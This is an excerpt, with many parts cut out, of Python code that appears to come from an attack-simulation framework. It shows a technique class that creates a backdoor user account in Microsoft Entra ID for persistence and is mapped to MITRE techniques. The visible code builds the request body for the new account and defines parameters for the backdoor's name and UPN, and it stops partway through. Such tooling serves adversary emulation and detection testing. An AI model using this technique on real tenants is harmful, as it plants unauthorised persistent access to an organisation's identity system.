...
class EntraCreateBackdoorAccount(BaseTechnique):
    def __init__(self):
        ...
        super().__init__(
            ...
            "Create a new user account in Entra ID to mantain persistence",
            mitre_techniques,
        )
    ...
    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        ...
        try:
            ...
            backdoor_user_principal_name: str = kwargs.get(
                "backdoor_user_principal_name", None
            )
            ...
            data = {
                "accountEnabled": "true",
                "displayName": backdoor_display_name,
                "mailNickname": mail_nickname,
                "userPrincipalName": backdoor_user_principal_name,
                "passwordProfile": {
    ...
    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "backdoor_display_name": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "Backdoor Display Name",
                "input_field_type": "text",
            },
            "backdoor_user_principal_name": {
                "type": "str",
                "required": True,
                "default": None,
                "name": "Backdoor UPN",
